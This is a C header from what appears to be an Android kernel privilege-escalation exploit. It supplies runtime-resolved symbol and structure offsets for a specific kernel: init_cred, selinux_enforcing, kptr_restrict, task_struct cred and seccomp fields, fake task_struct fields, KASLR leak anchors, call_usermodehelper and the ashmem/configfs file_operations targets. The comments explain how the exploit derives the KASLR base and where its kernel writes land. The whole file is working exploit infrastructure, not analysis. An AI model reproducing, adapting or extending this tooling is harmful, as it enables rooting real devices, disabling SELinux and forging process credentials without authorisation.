/*
 * Runtime offset resolution.
 *
 * PROBLEM THIS SOLVES
 * -------------------
 * target.h is included by common.h, so every translation unit sees its
 * per-device symbol offsets as compile-time constants. Only main.c used to
 * #undef those constants and rebind them to active_offsets->*, which meant
 * fops.c / util.c / slide.c / root.c kept writing the *fallback* device's
 * addresses no matter which offsets.h table entry matched at runtime.
 * Symptom on a non-fallback device: KASLR base derived from the wrong
 * ASHMEM_OPEN constant (non-page-aligned), configfs pwrite landing on
 * unrelated text, every write silently ineffective.
 *
 * This header is included at the END of common.h so all TUs get runtime
 * resolution. Macro expansion is lazy, so the derived macros in target.h
 * (INIT_TASK, SLIDE_*_IMAGE, ...) pick up the rebound values automatically.
 *
 * RULES
 * - Every field used here must exist in struct kernel_offsets.
 * - Fallbacks are the target.h defaults and must match the primary device.
 * - Do NOT rebind P0_KERNEL_PHYS_LOAD / P0_PHYS_OFFSET: util.c initializes
 *   p0_* globals from them at file scope (self-reference would not compile).
 *   Rebind P0_KERNEL_PHYS_DELTA and P0_DATA_ALIAS_CONST instead.
 */
#ifndef RUNTIME_STRUCT_OFFSETS_H
#define RUNTIME_STRUCT_OFFSETS_H

#include "../devices/offsets.h"

extern const struct kernel_offsets *active_offsets;
extern uint64_t p0_kimage_text_base;
extern uint64_t p0_kernel_phys_load;
extern uint64_t p0_phys_offset;

/* 0 in the table means "this kernel does not have it" for the handful of
 * fields where 0 is never a valid offset. Everything else uses the value. */
#define _RSO(field, fallback) \
  ((active_offsets && active_offsets->field) ? active_offsets->field : (fallback))
#define _RSO_64(field, fallback) \
  ((uint64_t)((active_offsets && active_offsets->field) ? active_offsets->field : (fallback)))

/* Raw value, including 0 — for fields where 0 is a real answer
 * (off_ashmem_misc_fops, off_security_hook_heads). */
#define _RSO_RAW(field, fallback) \
  (active_offsets ? active_offsets->field : (fallback))

/* ---- kernel image base ------------------------------------------------ */
#define _KIMAGE_TEXT_BASE_DEFAULT 0xffffffc080000000ULL
#undef KIMAGE_TEXT_BASE
#define KIMAGE_TEXT_BASE p0_kimage_text_base

/* ---- physical mapping ------------------------------------------------- */
/* These two must stay compile-time selectable for util.c's file-scope
 * initializers, but every *derived* expression below is runtime. */
#undef P0_KERNEL_PHYS_DELTA
#define P0_KERNEL_PHYS_DELTA (p0_kernel_phys_load - p0_phys_offset)

#undef P0_DATA_ALIAS_CONST
#define P0_DATA_ALIAS_CONST(image_addr)                                  \
  (P0_PAGE_OFFSET |                                                      \
   ((image_addr) - p0_kimage_text_base + P0_KERNEL_PHYS_DELTA))

/* ---- global symbol offsets ------------------------------------------- */
#undef INIT_TASK_OFF
#undef INIT_CRED_OFF
#undef INIT_UTS_NS_OFF
#undef EMPTY_ZERO_PAGE_OFF
#undef ROOT_TASK_GROUP_OFF
#undef SELINUX_ENFORCING_OFF
#undef KPTR_RESTRICT_OFF
#undef SELINUX_BLOB_SIZES_OFF
#undef SECURITY_HOOK_HEADS_OFF
#undef KMALLOC_CACHES_OFF
#undef ANON_PIPE_BUF_OPS_OFF
#undef CAP_CAPABLE_ACTIVE_OFF
#undef SYSTEM_UNBOUND_WQ_OFF
#undef CALL_USERMODEHELPER_EXEC_WORK_OFF

#define INIT_TASK_OFF                  _RSO(off_init_task,          0x023ECF00ULL)
#define INIT_CRED_OFF                  _RSO(off_init_cred,          0x02402A68ULL)
#define INIT_UTS_NS_OFF                _RSO(off_init_uts_ns,        0x02574650ULL)
#define EMPTY_ZERO_PAGE_OFF            _RSO(off_empty_zero_page,    0x02614000ULL)
#define ROOT_TASK_GROUP_OFF            _RSO(off_root_task_group,    0x0261C580ULL)
#define SELINUX_ENFORCING_OFF          _RSO(off_selinux_enforcing,  0x026684F0ULL)
#define KPTR_RESTRICT_OFF              _RSO(off_kptr_restrict,      0x023EB638ULL)
#define SELINUX_BLOB_SIZES_OFF         _RSO(off_selinux_blob_sizes, 0x0182F4E8ULL)
#define KMALLOC_CACHES_OFF             _RSO(off_kmalloc_caches,     0x018294C0ULL)
#define ANON_PIPE_BUF_OPS_OFF          _RSO(off_anon_pipe_buf_ops,  0x0120ED88ULL)
#define CAP_CAPABLE_ACTIVE_OFF         _RSO(off_cap_capable_active, 0x02662B50ULL)
#define SYSTEM_UNBOUND_WQ_OFF          _RSO(off_system_unbound_wq,  0x01829250ULL)
#define CALL_USERMODEHELPER_EXEC_WORK_OFF \
  _RSO(off_call_usermodehelper_exec_work, 0x000F6744ULL)

/* Legacy LSM hook lists were replaced by static calls on this kernel; the
 * field is 0 in every 6.12 table entry. Keep 0 so SECURITY_CAPABLE_HEAD
 * stays visibly invalid instead of silently aliasing KIMAGE_TEXT_BASE + 0x40
 * (which reads the image's PE timestamp). */
#define SECURITY_HOOK_HEADS_OFF        _RSO_RAW(off_security_hook_heads, 0)

/* ---- ashmem / configfs text offsets ---------------------------------- */
#undef ASHMEM_MISC_FOPS_OFF
#undef ASHMEM_FOPS_OFF
#undef ASHMEM_IOCTL_OFF
#undef ASHMEM_COMPAT_IOCTL_OFF
#undef ASHMEM_MMAP_OFF
#undef ASHMEM_OPEN_OFF
#undef ASHMEM_RELEASE_OFF
#undef ASHMEM_SHOW_FDINFO_OFF
#undef CONFIGFS_READ_ITER_OFF
#undef CONFIGFS_BIN_WRITE_ITER_OFF
#undef COPY_SPLICE_READ_OFF
#undef NOOP_LLSEEK_OFF

/* 0 is a legitimate answer here: this kernel's ashmem is the Rust driver and
 * exposes no miscdevice fops table, so the UMH path is unavailable by design.
 * A 0 value yields KIMAGE_TEXT_BASE, and callers must test it before use. */
#define ASHMEM_MISC_FOPS_OFF           _RSO_RAW(off_ashmem_misc_fops, 0)
#define ASHMEM_FOPS_OFF                _RSO(off_ashmem_fops,         0x02695A88ULL)
#define ASHMEM_IOCTL_OFF               _RSO(off_ashmem_ioctl,        0x00D7E5A8ULL)
#define ASHMEM_COMPAT_IOCTL_OFF        _RSO(off_ashmem_compat_ioctl, 0x00D7EB90ULL)
#define ASHMEM_MMAP_OFF                _RSO(off_ashmem_mmap,         0x00D7EC0CULL)
#define ASHMEM_OPEN_OFF                _RSO(off_ashmem_open,         0x00D7EC68ULL)
#define ASHMEM_RELEASE_OFF             _RSO(off_ashmem_release,      0x00D7E668ULL)
#define ASHMEM_SHOW_FDINFO_OFF         _RSO(off_ashmem_show_fdinfo,  0x00D7EB68ULL)
#define CONFIGFS_READ_ITER_OFF         _RSO(off_configfs_read_iter,      0x00511A7CULL)
#define CONFIGFS_BIN_WRITE_ITER_OFF    _RSO(off_configfs_bin_write_iter, 0x00512028ULL)
#define COPY_SPLICE_READ_OFF           _RSO(off_copy_splice_read,        0x0048E034ULL)
#define NOOP_LLSEEK_OFF                _RSO(off_noop_llseek,             0x0043B678ULL)

/* ---- KASLR leak anchors ---------------------------------------------- */
#undef SLIDE_NFULNL_LOGGER_OFF
#undef SLIDE_LOGGERS_0_1_OFF
#undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
#undef SLIDE_SYSCTL_BOOTID_OFF

#define SLIDE_NFULNL_LOGGER_OFF        _RSO(off_slide_nfulnl_logger, 0x023E2198ULL)
#define SLIDE_LOGGERS_0_1_OFF          _RSO(off_slide_loggers_0_1,   0x023E20E8ULL)
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF  _RSO(off_slide_boot_id,       0x02689868ULL)
#define SLIDE_SYSCTL_BOOTID_OFF        _RSO(off_slide_boot_id,       0x02689868ULL)

/* ---- task_struct fields ---------------------------------------------- */
#undef FAKE_TASK_PRIO_OFF
#undef FAKE_TASK_NORMAL_PRIO_OFF
#undef FAKE_TASK_TASK_GROUP_OFF
#undef FAKE_TASK_PI_LOCK_OFF
#undef FAKE_TASK_PI_WAITERS_OFF
#undef FAKE_TASK_PI_TOP_TASK_OFF
#undef FAKE_TASK_PI_BLOCKED_ON_OFF
#undef MM_OWNER_OFF
#undef TASK_PID_OFF
#undef TASK_TGID_OFF
#undef TASK_REAL_PARENT_OFF
#undef TASK_ATOMIC_FLAGS_OFF
#undef TASK_REAL_CRED_OFF
#undef TASK_CRED_OFF
#undef TASK_COMM_OFF
#undef TASK_TASKS_OFF
#undef TASK_SECCOMP_OFF

#define FAKE_TASK_PRIO_OFF           _RSO(task_prio,             0x94)
#define FAKE_TASK_NORMAL_PRIO_OFF    _RSO(task_normal_prio,      0x9C)
#define FAKE_TASK_TASK_GROUP_OFF     _RSO(task_sched_task_group, 0x420)
#define FAKE_TASK_PI_LOCK_OFF        _RSO(task_pi_lock,          0x9EC)
#define FAKE_TASK_PI_WAITERS_OFF     _RSO(task_pi_waiters,       0xA00)
#define FAKE_TASK_PI_TOP_TASK_OFF    _RSO(task_pi_top_task,      0xA10)
#define FAKE_TASK_PI_BLOCKED_ON_OFF  _RSO(task_pi_blocked_on,    0xA18)
#define MM_OWNER_OFF                 _RSO(mm_owner,              0x410)
#define TASK_PID_OFF                 _RSO(task_pid,              0x708)
#define TASK_TGID_OFF                _RSO(task_tgid,             0x70C)
#define TASK_REAL_PARENT_OFF         _RSO(task_real_parent,      0x718)
#define TASK_ATOMIC_FLAGS_OFF        _RSO(task_atomic_flags,     0x6C8)
#define TASK_REAL_CRED_OFF           _RSO(task_real_cred,        0x8F8)
#define TASK_CRED_OFF                _RSO(task_cred,             0x900)
#define TASK_COMM_OFF                _RSO(task_comm,             0x910)
#define TASK_TASKS_OFF               _RSO(task_tasks,            0x638)
#define TASK_SECCOMP_OFF             _RSO(task_seccomp,          0x9C8)

/* ---- file_operations layout ------------------------------------------ */
#undef FOPS_LLSEEK_OFF
#undef FOPS_READ_OFF
#undef FOPS_WRITE_OFF
#undef FOPS_READ_ITER_OFF
#undef FOPS_WRITE_ITER_OFF
#undef FOPS_IOCTL_OFF
#undef FOPS_COMPAT_IOCTL_OFF
#undef FOPS_MMAP_OFF
#undef FOPS_OPEN_OFF
#undef FOPS_RELEASE_OFF
#undef FOPS_SPLICE_READ_OFF
#undef FOPS_SHOW_FDINFO_OFF

#define FOPS_LLSEEK_OFF       _RSO(fops_llseek,       0x10)
#define FOPS_READ_OFF         _RSO(fops_read,         0x18)
#define FOPS_WRITE_OFF        _RSO(fops_write,        0x20)
#define FOPS_READ_ITER_OFF    _RSO(fops_read_iter,    0x28)
#define FOPS_WRITE_ITER_OFF   _RSO(fops_write_iter,   0x30)
#define FOPS_IOCTL_OFF        _RSO(fops_ioctl,        0x50)
#define FOPS_COMPAT_IOCTL_OFF _RSO(fops_compat_ioctl, 0x58)
#define FOPS_MMAP_OFF         _RSO(fops_mmap,         0x60)
#define FOPS_OPEN_OFF         _RSO(fops_open,         0x68)
#define FOPS_RELEASE_OFF      _RSO(fops_release,      0x78)
#define FOPS_SPLICE_READ_OFF  _RSO(fops_splice_read,  0xb8)
#define FOPS_SHOW_FDINFO_OFF  _RSO(fops_show_fdinfo,  0xd8)

#endif /* RUNTIME_STRUCT_OFFSETS_H */
